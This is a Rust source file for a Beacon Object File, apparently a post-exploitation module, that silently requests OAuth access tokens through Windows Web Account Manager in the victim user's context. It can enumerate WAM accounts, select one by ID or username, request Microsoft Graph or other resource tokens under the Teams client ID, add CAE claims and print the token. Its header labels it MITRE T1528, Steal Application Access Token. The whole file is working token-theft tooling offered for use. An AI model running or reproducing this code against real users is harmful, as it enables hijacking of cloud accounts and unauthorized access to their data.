//! # askWAM BOF
//!
//! Requests an access token silently through Windows Web Account Manager (WAM)
//! in the current user's context. It can enumerate WAM accounts, select an
//! account by canonical ID or exact username, request v1 resource or v2 scope
//! tokens, and add Continuous Access Evaluation claims. It does not read WAM
//! cache files, show an interactive prompt, or start a worker thread.
//!
//! Based on the MIT-licensed askWAM research by Dirk-jan Mollema.
//!
//! ## MITRE ATT&CK
//! - T1528 - Steal Application Access Token
//! - T1555 - Credentials from Password Stores
//!
//! ## Arguments
//! - `str`: Client ID, or an empty string for the Microsoft Teams default.
//! - `str`: OAuth scope, or an empty string for Microsoft Graph `.default`.
//! - `str`: OAuth resource, or an empty string to use the scope flow.
//! - `str`: Authority, or an empty string for `organizations`.
//! - `str`: Claims JSON, or an empty string.
//! - `str`: Canonical WAM account ID, or an empty string.
//! - `str`: Exact username selector, or an empty string.
//! - `int`: Timeout in seconds from 1 through 300.
//! - `int`: Hide token output: `0` or `1`.
//! - `int`: Request CAE claim `cp1`: `0` or `1`.
//! - `int`: Enumerate WAM accounts instead of requesting a token: `0` or `1`.

#![no_std]

use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use core::mem::transmute;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};

type HResult = i32;
type HStringRaw = *mut c_void;

const S_OK: HResult = 0;
const E_FAIL: HResult = 0x8000_4005u32 as i32;
const E_INVALIDARG: HResult = 0x8007_0057u32 as i32;
const E_UNEXPECTED: HResult = 0x8000_FFFFu32 as i32;
const RPC_E_CHANGED_MODE: HResult = 0x8001_0106u32 as i32;
const ERROR_CANCELLED: u32 = 1223;
const WAIT_TIMEOUT: u32 = 258;
const CSTR_EQUAL: i32 = 2;
const RO_INIT_MULTITHREADED: u32 = 1;

const DEFAULT_CLIENT_ID: &str = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
const DEFAULT_SCOPE: &str = "https://graph.microsoft.com/.default";
const DEFAULT_AUTHORITY: &str = "organizations";
const PROVIDER_ID: &str = "https://login.microsoft.com";
const MANAGER_CLASS: &str = "Windows.Security.Authentication.Web.Core.WebAuthenticationCoreManager";
const REQUEST_CLASS: &str = "Windows.Security.Authentication.Web.Core.WebTokenRequest";
const RESERVED_SCOPES: &str = " openid offline_access profile";
const CAE_CLAIMS: &str = r#"{"access_token":{"xms_cc":{"values":["cp1"]}}}"#;

#[repr(C)]
struct Guid {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

const IID_ASYNC_INFO: Guid = Guid {
    data1: 0x00000036,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};
const IID_WAM_STATICS: Guid = Guid {
    data1: 0x6aca7c92,
    data2: 0xa581,
    data3: 0x4479,
    data4: [0x9c, 0x10, 0x75, 0x2e, 0xff, 0x44, 0xfd, 0x34],
};
const IID_REQUEST_FACTORY: Guid = Guid {
    data1: 0x6cf2141c,
    data2: 0x0ff0,
    data3: 0x4c67,
    data4: [0xb8, 0x4f, 0x99, 0xdd, 0xbe, 0x4a, 0x72, 0xc9],
};
const IID_WAM_STATICS4: Guid = Guid {
    data1: 0x54e633fe,
    data2: 0x96e0,
    data3: 0x41e8,
    data4: [0x98, 0x32, 0x12, 0x98, 0x89, 0x7c, 0x2a, 0xaf],
};
const IID_WEB_ACCOUNT2: Guid = Guid {
    data1: 0x7b56d6f8,
    data2: 0x990b,
    data3: 0x4eb5,
    data4: [0x94, 0xa7, 0x56, 0x21, 0xf3, 0xa8, 0xb8, 0x24],
};

#[repr(C)]
struct AbiObject {
    vtable: *const *const c_void,
}

type QueryInterfaceFn =
    unsafe extern "system" fn(*mut AbiObject, *const Guid, *mut *mut AbiObject) -> HResult;
type ReleaseFn = unsafe extern "system" fn(*mut AbiObject) -> u32;
type AsyncErrorFn = unsafe extern "system" fn(*mut AbiObject, *mut HResult) -> HResult;
type AsyncCancelFn = unsafe extern "system" fn(*mut AbiObject) -> HResult;
type ProviderLookupFn = unsafe extern "system" fn(
    *mut AbiObject,
    HStringRaw,
    HStringRaw,
    *mut *mut AbiObject,
) -> HResult;
type SilentTokenFn =
    unsafe extern "system" fn(*mut AbiObject, *mut AbiObject, *mut *mut AbiObject) -> HResult;
type SilentTokenWithAccountFn = unsafe extern "system" fn(
    *mut AbiObject,
    *mut AbiObject,
    *mut AbiObject,
    *mut *mut AbiObject,
) -> HResult;
type FindAccountFn = unsafe extern "system" fn(
    *mut AbiObject,
    *mut AbiObject,
    HStringRaw,
    *mut *mut AbiObject,
) -> HResult;
type FindAllAccountsFn = unsafe extern "system" fn(
    *mut AbiObject,
    *mut AbiObject,
    HStringRaw,
    *mut *mut AbiObject,
) -> HResult;
type CreateRequestFn = unsafe extern "system" fn(
    *mut AbiObject,
    *mut AbiObject,
    HStringRaw,
    HStringRaw,
    i32,
    *mut *mut AbiObject,
) -> HResult;
type GetObjectFn = unsafe extern "system" fn(*mut AbiObject, *mut *mut AbiObject) -> HResult;
type MapInsertFn =
    unsafe extern "system" fn(*mut AbiObject, HStringRaw, HStringRaw, *mut u8) -> HResult;
type GetStatusFn = unsafe extern "system" fn(*mut AbiObject, *mut i32) -> HResult;
type GetUintFn = unsafe extern "system" fn(*mut AbiObject, *mut u32) -> HResult;
type VectorGetAtFn = unsafe extern "system" fn(*mut AbiObject, u32, *mut *mut AbiObject) -> HResult;
type GetStringFn = unsafe extern "system" fn(*mut AbiObject, *mut HStringRaw) -> HResult;

unsafe extern "system" {
    fn RoInitialize(init_type: u32) -> HResult;
    fn RoUninitialize();
    fn RoGetActivationFactory(
        class_id: HStringRaw,
        iid: *const Guid,
        factory: *mut *mut AbiObject,
    ) -> HResult;
    fn WindowsCreateString(source: *const u16, length: u32, output: *mut HStringRaw) -> HResult;
    fn WindowsDeleteString(value: HStringRaw) -> HResult;
    fn WindowsGetStringRawBuffer(value: HStringRaw, length: *mut u32) -> *const u16;
    fn GetTickCount64() -> u64;
    fn Sleep(milliseconds: u32);
    fn CompareStringOrdinal(
        left: *const u16,
        left_length: i32,
        right: *const u16,
        right_length: i32,
        ignore_case: i32,
    ) -> i32;
}

fn succeeded(result: HResult) -> bool {
    result >= 0
}

fn hresult_from_win32(error: u32) -> HResult {
    if error == 0 {
        0
    } else {
        ((error & 0x0000_ffff) | 0x8007_0000) as i32
    }
}

fn wide(value: &str) -> Vec<u16> {
    value.encode_utf16().chain(core::iter::once(0)).collect()
}

fn wide_len(value: &[u16]) -> usize {
    value
        .iter()
        .position(|unit| *unit == 0)
        .unwrap_or(value.len())
}

struct HString(HStringRaw);

impl HString {
    fn new(value: &[u16]) -> Result<Self, HResult> {
        let length = wide_len(value);
        if length > u32::MAX as usize {
            return Err(E_INVALIDARG);
        }
        let mut output = core::ptr::null_mut();
        let result = unsafe { WindowsCreateString(value.as_ptr(), length as u32, &mut output) };
        if succeeded(result) {
            Ok(Self(output))
        } else {
            Err(result)
        }
    }

    fn from_raw(value: HStringRaw) -> Self {
        Self(value)
    }

    fn raw(&self) -> HStringRaw {
        self.0
    }

    fn to_string(&self) -> String {
        let mut length = 0u32;
        let pointer = unsafe { WindowsGetStringRawBuffer(self.0, &mut length) };
        if pointer.is_null() || length == 0 {
            return String::new();
        }
        let units = unsafe { core::slice::from_raw_parts(pointer, length as usize) };
        String::from_utf16_lossy(units)
    }
}

impl Drop for HString {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { WindowsDeleteString(self.0) };
        }
    }
}

struct ComPtr(*mut AbiObject);

impl ComPtr {
    fn null() -> Self {
        Self(core::ptr::null_mut())
    }

    fn from_raw(value: *mut AbiObject) -> Self {
        Self(value)
    }

    fn as_ptr(&self) -> *mut AbiObject {
        self.0
    }

    fn is_null(&self) -> bool {
        self.0.is_null()
    }
}

impl Drop for ComPtr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe {
                let release: ReleaseFn = transmute(*(*self.0).vtable.add(2));
                release(self.0);
            }
        }
    }
}

unsafe fn query_interface(object: *mut AbiObject, iid: &Guid) -> Result<ComPtr, HResult> {
    if object.is_null() {
        return Err(E_INVALIDARG);
    }
    let function: QueryInterfaceFn = unsafe { transmute(*(*object).vtable.add(0)) };
    let mut output = core::ptr::null_mut();
    let result = unsafe { function(object, iid, &mut output) };
    if succeeded(result) {
        Ok(ComPtr::from_raw(output))
    } else {
        Err(result)
    }
}

unsafe fn call_object(object: *mut AbiObject, slot: usize) -> Result<ComPtr, HResult> {
    if object.is_null() {
        return Err(E_INVALIDARG);
    }
    let function: GetObjectFn = unsafe { transmute(*(*object).vtable.add(slot)) };
    let mut output = core::ptr::null_mut();
    let result = unsafe { function(object, &mut output) };
    if succeeded(result) {
        Ok(ComPtr::from_raw(output))
    } else {
        Err(result)
    }
}

unsafe fn call_status(object: *mut AbiObject, slot: usize) -> Result<i32, HResult> {
    if object.is_null() {
        return Err(E_INVALIDARG);
    }
    let function: GetStatusFn = unsafe { transmute(*(*object).vtable.add(slot)) };
    let mut output = 0i32;
    let result = unsafe { function(object, &mut output) };
    if succeeded(result) {
        Ok(output)
    } else {
        Err(result)
    }
}

unsafe fn call_uint(object: *mut AbiObject, slot: usize) -> Result<u32, HResult> {
    if object.is_null() {
        return Err(E_INVALIDARG);
    }
    let function: GetUintFn = unsafe { transmute(*(*object).vtable.add(slot)) };
    let mut output = 0u32;
    let result = unsafe { function(object, &mut output) };
    if succeeded(result) {
        Ok(output)
    } else {
        Err(result)
    }
}

unsafe fn call_string(object: *mut AbiObject, slot: usize) -> Result<HString, HResult> {
    if object.is_null() {
        return Err(E_INVALIDARG);
    }
    let function: GetStringFn = unsafe { transmute(*(*object).vtable.add(slot)) };
    let mut output = core::ptr::null_mut();
    let result = unsafe { function(object, &mut output) };
    if succeeded(result) {
        Ok(HString::from_raw(output))
    } else {
        Err(result)
    }
}

fn wait_async(operation: &ComPtr, timeout_ms: u32) -> Result<(), HResult> {
    let info = unsafe { query_interface(operation.as_ptr(), &IID_ASYNC_INFO)? };
    let started = unsafe { GetTickCount64() };
    loop {
        let status = unsafe { call_status(info.as_ptr(), 7)? };
        match status {
            1 => return Ok(()),
            2 => return Err(hresult_from_win32(ERROR_CANCELLED)),
            3 => {
                let function: AsyncErrorFn = unsafe { transmute(*(*info.as_ptr()).vtable.add(8)) };
                let mut error = E_FAIL;
                unsafe { function(info.as_ptr(), &mut error) };
                return Err(error);
            }
            _ => {}
        }
        if unsafe { GetTickCount64() }.wrapping_sub(started) >= timeout_ms as u64 {
            let cancel: AsyncCancelFn = unsafe { transmute(*(*info.as_ptr()).vtable.add(9)) };
            unsafe { cancel(info.as_ptr()) };
            return Err(hresult_from_win32(WAIT_TIMEOUT));
        }
        unsafe { Sleep(25) };
    }
}

fn activation_factory(class_name: &str, iid: &Guid) -> Result<ComPtr, HResult> {
    let class_wide = wide(class_name);
    let class = HString::new(&class_wide)?;
    let mut factory = core::ptr::null_mut();
    let result = unsafe { RoGetActivationFactory(class.raw(), iid, &mut factory) };
    if succeeded(result) {
        Ok(ComPtr::from_raw(factory))
    } else {
        Err(result)
    }
}

fn insert_property(map: &ComPtr, key: &str, value: &str) -> Result<(), HResult> {
    let key_wide = wide(key);
    let value_wide = wide(value);
    let key = HString::new(&key_wide)?;
    let value = HString::new(&value_wide)?;
    let function: MapInsertFn = unsafe { transmute(*(*map.as_ptr()).vtable.add(10)) };
    let mut replaced = 0u8;
    let result = unsafe { function(map.as_ptr(), key.raw(), value.raw(), &mut replaced) };
    if succeeded(result) {
        Ok(())
    } else {
        Err(result)
    }
}

fn claims_have_object_root(claims: &str) -> bool {
    let trimmed = claims.trim_matches(|character: char| character.is_ascii_whitespace());
    trimmed.len() >= 2 && trimmed.starts_with('{') && trimmed.ends_with('}')
}

fn account_details(account: &ComPtr) -> Result<(String, String, i32), HResult> {
    let username = unsafe { call_string(account.as_ptr(), 7)? };
    let state = unsafe { call_status(account.as_ptr(), 8)? };
    let account2 = unsafe { query_interface(account.as_ptr(), &IID_WEB_ACCOUNT2)? };
    let id = unsafe { call_string(account2.as_ptr(), 6)? };
    Ok((id.to_string(), username.to_string(), state))
}

fn account_state_name(state: i32) -> &'static str {
    match state {
        0 => "None",
        1 => "Connected",
        2 => "Error",
        _ => "Unknown",
    }
}

fn print_account(account: &ComPtr, index: Option<u32>) -> Result<(), HResult> {
    let (id, username, state) = account_details(account)?;
    match index {
        Some(value) => println!(
            "[{}] username={} accountId={} state={}",
            value,
            username,
            id,
            account_state_name(state)
        ),
        None => println!(
            "account username={} accountId={} state={}",
            username,
            id,
            account_state_name(state)
        ),
    }
    Ok(())
}

fn provider_error(result: &ComPtr) {
    let error = match unsafe { call_object(result.as_ptr(), 8) } {
        Ok(value) if !value.is_null() => value,
        _ => return,
    };
    if let Ok(code) = unsafe { call_uint(error.as_ptr(), 6) } {
        eprintln!("WAM provider error: 0x{:08x}", code);
    }
}

struct Request<'a> {
    client_id: &'a str,
    scope: &'a str,
    resource: Option<&'a str>,
    authority: &'a str,
    claims: Option<&'a str>,
    account_id: Option<&'a str>,
    username: Option<&'a str>,
    timeout_ms: u32,
    hide_token: bool,
    enumerate: bool,
}

fn acquire(request: &Request<'_>) -> Result<(), (i32, HResult)> {
    let statics =
        activation_factory(MANAGER_CLASS, &IID_WAM_STATICS).map_err(|error| (40, error))?;
    let provider_id = HString::new(&wide(PROVIDER_ID)).map_err(|error| (40, error))?;
    let authority = HString::new(&wide(request.authority)).map_err(|error| (40, error))?;
    let lookup: ProviderLookupFn = unsafe { transmute(*(*statics.as_ptr()).vtable.add(12)) };
    let mut raw = core::ptr::null_mut();
    let result = unsafe {
        lookup(
            statics.as_ptr(),
            provider_id.raw(),
            authority.raw(),
            &mut raw,
        )
    };
    if !succeeded(result) {
        return Err((40, result));
    }
    let provider_operation = ComPtr::from_raw(raw);
    wait_async(&provider_operation, request.timeout_ms).map_err(|error| (40, error))?;
    let provider =
        unsafe { call_object(provider_operation.as_ptr(), 8) }.map_err(|error| (40, error))?;
    if provider.is_null() {
        eprintln!("WAM account provider is unavailable");
        return Err((30, S_OK));
    }

    let client_id = HString::new(&wide(request.client_id)).map_err(|error| (40, error))?;
    let mut selected_account = ComPtr::null();

    if request.enumerate || request.username.is_some() {
        let statics4 = unsafe { query_interface(statics.as_ptr(), &IID_WAM_STATICS4) }
            .map_err(|error| (40, error))?;
        let find_all: FindAllAccountsFn = unsafe { transmute(*(*statics4.as_ptr()).vtable.add(7)) };
        raw = core::ptr::null_mut();
        let result = unsafe {
            find_all(
                statics4.as_ptr(),
                provider.as_ptr(),
                client_id.raw(),
                &mut raw,
            )
        };
        if !succeeded(result) {
            return Err((40, result));
        }
        let operation = ComPtr::from_raw(raw);
        wait_async(&operation, request.timeout_ms).map_err(|error| (40, error))?;
        let accounts_result =
            unsafe { call_object(operation.as_ptr(), 8) }.map_err(|error| (40, error))?;
        let status =
            unsafe { call_status(accounts_result.as_ptr(), 7) }.map_err(|error| (40, error))?;
        if status != 0 {
            eprintln!("WAM account enumeration status: {}", status);
            return Err((31, S_OK));
        }
        let accounts =
            unsafe { call_object(accounts_result.as_ptr(), 6) }.map_err(|error| (40, error))?;
        let count = unsafe { call_uint(accounts.as_ptr(), 7) }.map_err(|error| (40, error))?;
        if count > 256 {
            eprintln!("WAM account count exceeds the safety bound: {}", count);
            return Err((31, E_UNEXPECTED));
        }
        if request.enumerate {
            println!("WAM accounts: {}", count);
            for index in 0..count {
                let get_at: VectorGetAtFn =
                    unsafe { transmute(*(*accounts.as_ptr()).vtable.add(6)) };
                raw = core::ptr::null_mut();
                let result = unsafe { get_at(accounts.as_ptr(), index, &mut raw) };
                if !succeeded(result) {
                    return Err((40, result));
                }
                print_account(&ComPtr::from_raw(raw), Some(index)).map_err(|error| (40, error))?;
            }
            return Ok(());
        }

        let username = request.username.unwrap_or("");
        let username_wide = wide(username);
        let mut matches = 0u32;
        for index in 0..count {
            let get_at: VectorGetAtFn = unsafe { transmute(*(*accounts.as_ptr()).vtable.add(6)) };
            raw = core::ptr::null_mut();
            let result = unsafe { get_at(accounts.as_ptr(), index, &mut raw) };
            if !succeeded(result) {
                return Err((40, result));
            }
            let account = ComPtr::from_raw(raw);
            let candidate =
                unsafe { call_string(account.as_ptr(), 7) }.map_err(|error| (40, error))?;
            let candidate_pointer =
                unsafe { WindowsGetStringRawBuffer(candidate.raw(), core::ptr::null_mut()) };
            let equal = unsafe {
                CompareStringOrdinal(candidate_pointer, -1, username_wide.as_ptr(), -1, 1)
            } == CSTR_EQUAL;
            if equal {
                matches += 1;
                if selected_account.is_null() {
                    selected_account = account;
                }
            }
        }
        if matches != 1 {
            eprintln!(
                "{}: matchCount={}",
                if matches == 0 {
                    "account_not_found"
                } else {
                    "account_ambiguous"
                },
                matches
            );
            return Err((if matches == 0 { 33 } else { 34 }, S_OK));
        }
    } else if let Some(account_id_value) = request.account_id {
        let account_id = HString::new(&wide(account_id_value)).map_err(|error| (40, error))?;
        let find: FindAccountFn = unsafe { transmute(*(*statics.as_ptr()).vtable.add(10)) };
        raw = core::ptr::null_mut();
        let result = unsafe {
            find(
                statics.as_ptr(),
                provider.as_ptr(),
                account_id.raw(),
                &mut raw,
            )
        };
        if !succeeded(result) {
            return Err((40, result));
        }
        let operation = ComPtr::from_raw(raw);
        wait_async(&operation, request.timeout_ms).map_err(|error| (40, error))?;
        selected_account =
            unsafe { call_object(operation.as_ptr(), 8) }.map_err(|error| (40, error))?;
        if selected_account.is_null() {
            eprintln!("account_not_found");
            return Err((33, S_OK));
        }
    }

    let factory =
        activation_factory(REQUEST_CLASS, &IID_REQUEST_FACTORY).map_err(|error| (40, error))?;
    let requested_scope = match request.resource {
        Some(_) => String::new(),
        None => {
            let mut value = String::from(request.scope);
            value.push_str(RESERVED_SCOPES);
            value
        }
    };
    if requested_scope.len() > 4096 {
        return Err((40, E_INVALIDARG));
    }
    let scope = HString::new(&wide(&requested_scope)).map_err(|error| (40, error))?;
    let create: CreateRequestFn = unsafe { transmute(*(*factory.as_ptr()).vtable.add(7)) };
    raw = core::ptr::null_mut();
    let result = unsafe {
        create(
            factory.as_ptr(),
            provider.as_ptr(),
            scope.raw(),
            client_id.raw(),
            0,
            &mut raw,
        )
    };
    if !succeeded(result) {
        return Err((40, result));
    }
    let token_request = ComPtr::from_raw(raw);
    let properties =
        unsafe { call_object(token_request.as_ptr(), 10) }.map_err(|error| (40, error))?;
    if let Some(resource) = request.resource {
        insert_property(&properties, "resource", resource).map_err(|error| (40, error))?;
    } else {
        insert_property(&properties, "wam_compat", "2.0").map_err(|error| (40, error))?;
    }
    if let Some(claims) = request.claims {
        insert_property(&properties, "claims", claims).map_err(|error| (40, error))?;
    }

    raw = core::ptr::null_mut();
    let result = if selected_account.is_null() {
        let function: SilentTokenFn = unsafe { transmute(*(*statics.as_ptr()).vtable.add(6)) };
        unsafe { function(statics.as_ptr(), token_request.as_ptr(), &mut raw) }
    } else {
        let function: SilentTokenWithAccountFn =
            unsafe { transmute(*(*statics.as_ptr()).vtable.add(7)) };
        unsafe {
            function(
                statics.as_ptr(),
                token_request.as_ptr(),
                selected_account.as_ptr(),
                &mut raw,
            )
        }
    };
    if !succeeded(result) {
        return Err((40, result));
    }
    let token_operation = ComPtr::from_raw(raw);
    wait_async(&token_operation, request.timeout_ms).map_err(|error| (40, error))?;
    let result =
        unsafe { call_object(token_operation.as_ptr(), 8) }.map_err(|error| (40, error))?;
    let status = unsafe { call_status(result.as_ptr(), 7) }.map_err(|error| (40, error))?;
    if status != 0 {
        eprintln!("WAM token request status: {}", status);
        provider_error(&result);
        return Err((if status == 3 { 20 } else { 32 }, S_OK));
    }

    let responses = unsafe { call_object(result.as_ptr(), 6) }.map_err(|error| (40, error))?;
    let count = unsafe { call_uint(responses.as_ptr(), 7) }.map_err(|error| (40, error))?;
    if count == 0 || count > 64 {
        return Err((40, E_UNEXPECTED));
    }
    let get_at: VectorGetAtFn = unsafe { transmute(*(*responses.as_ptr()).vtable.add(6)) };
    raw = core::ptr::null_mut();
    let result = unsafe { get_at(responses.as_ptr(), 0, &mut raw) };
    if !succeeded(result) {
        return Err((40, result));
    }
    let response = ComPtr::from_raw(raw);
    let token = unsafe { call_string(response.as_ptr(), 6) }.map_err(|error| (40, error))?;
    let token_text = token.to_string();
    println!(
        "WAM success: requestMode={} tokenLength={} claimsRequested={}",
        if request.resource.is_some() {
            "resource"
        } else {
            "scope"
        },
        token_text.len(),
        request.claims.is_some()
    );
    if !request.hide_token {
        println!("accessToken={}", token_text);
    }
    if let Ok(account) = unsafe { call_object(response.as_ptr(), 8) } {
        if !account.is_null() {
            print_account(&account, None).map_err(|error| (40, error))?;
        }
    }
    Ok(())
}

fn packed_string(parser: &mut DataParser, maximum: usize) -> Option<String> {
    let bytes = parser.get_bytes();
    if bytes.is_empty() || bytes.len() > maximum.checked_add(1)? || bytes.last().copied() != Some(0)
    {
        return None;
    }
    Some(String::from(
        core::str::from_utf8(&bytes[..bytes.len() - 1]).ok()?,
    ))
}

fn optional(value: String) -> Option<String> {
    (!value.is_empty()).then_some(value)
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut client_id = String::from(DEFAULT_CLIENT_ID);
    let mut scope = String::from(DEFAULT_SCOPE);
    let mut resource = None;
    let mut authority = String::from(DEFAULT_AUTHORITY);
    let mut claims = None;
    let mut account_id = None;
    let mut username = None;
    let mut timeout_seconds = 30i32;
    let mut hide_token = false;
    let mut cae = false;
    let mut enumerate = false;
    let mut custom_scope = false;

    if len != 0 {
        let mut parser = DataParser::new(args, len);
        let client_arg = match packed_string(&mut parser, 256) {
            Some(value) => value,
            None => {
                eprintln!("invalid client ID argument");
                return;
            }
        };
        let scope_arg = match packed_string(&mut parser, 4096) {
            Some(value) => value,
            None => {
                eprintln!("invalid scope argument");
                return;
            }
        };
        let resource_arg = match packed_string(&mut parser, 4096) {
            Some(value) => value,
            None => {
                eprintln!("invalid resource argument");
                return;
            }
        };
        let authority_arg = match packed_string(&mut parser, 512) {
            Some(value) => value,
            None => {
                eprintln!("invalid authority argument");
                return;
            }
        };
        let claims_arg = match packed_string(&mut parser, 16384) {
            Some(value) => value,
            None => {
                eprintln!("invalid claims argument");
                return;
            }
        };
        let account_arg = match packed_string(&mut parser, 4096) {
            Some(value) => value,
            None => {
                eprintln!("invalid account ID argument");
                return;
            }
        };
        let username_arg = match packed_string(&mut parser, 1024) {
            Some(value) => value,
            None => {
                eprintln!("invalid username argument");
                return;
            }
        };
        timeout_seconds = parser.get_int();
        let hide = parser.get_int();
        let cae_value = parser.get_int();
        let enumerate_value = parser.get_int();
        if parser.remaining() != 0
            || !matches!(hide, 0 | 1)
            || !matches!(cae_value, 0 | 1)
            || !matches!(enumerate_value, 0 | 1)
        {
            eprintln!("invalid integer switch or trailing argument data");
            return;
        }
        if !client_arg.is_empty() {
            client_id = client_arg;
        }
        if !scope_arg.is_empty() {
            scope = scope_arg;
            custom_scope = true;
        }
        resource = optional(resource_arg);
        if !authority_arg.is_empty() {
            authority = authority_arg;
        }
        claims = optional(claims_arg);
        account_id = optional(account_arg);
        username = optional(username_arg);
        hide_token = hide == 1;
        cae = cae_value == 1;
        enumerate = enumerate_value == 1;
    }

    if !(1..=300).contains(&timeout_seconds) {
        eprintln!("timeout must be between 1 and 300 seconds");
        return;
    }
    if cae && claims.is_some() {
        eprintln!("use either CAE or custom claims JSON, not both");
        return;
    }
    if cae {
        claims = Some(String::from(CAE_CLAIMS));
    }
    if claims
        .as_deref()
        .is_some_and(|value| !claims_have_object_root(value))
    {
        eprintln!("claims JSON must have an object root");
        return;
    }
    if resource.is_some() && custom_scope {
        eprintln!("use either a custom scope or a resource, not both");
        return;
    }
    if account_id.is_some() && username.is_some() {
        eprintln!("use either account ID or username, not both");
        return;
    }
    if enumerate && (account_id.is_some() || username.is_some()) {
        eprintln!("account enumeration cannot be combined with an account selector");
        return;
    }

    let initialized = unsafe { RoInitialize(RO_INIT_MULTITHREADED) };
    if !succeeded(initialized) && initialized != RPC_E_CHANGED_MODE {
        eprintln!("RoInitialize failed: 0x{:08x}", initialized as u32);
        return;
    }
    let request = Request {
        client_id: &client_id,
        scope: &scope,
        resource: resource.as_deref(),
        authority: &authority,
        claims: claims.as_deref(),
        account_id: account_id.as_deref(),
        username: username.as_deref(),
        timeout_ms: timeout_seconds as u32 * 1000,
        hide_token,
        enumerate,
    };
    if let Err((code, error)) = acquire(&request) {
        if error != S_OK {
            eprintln!(
                "WAM runtime error: code={} hresult=0x{:08x}",
                code, error as u32
            );
        }
    }
    if initialized != RPC_E_CHANGED_MODE {
        unsafe { RoUninitialize() };
    }
}
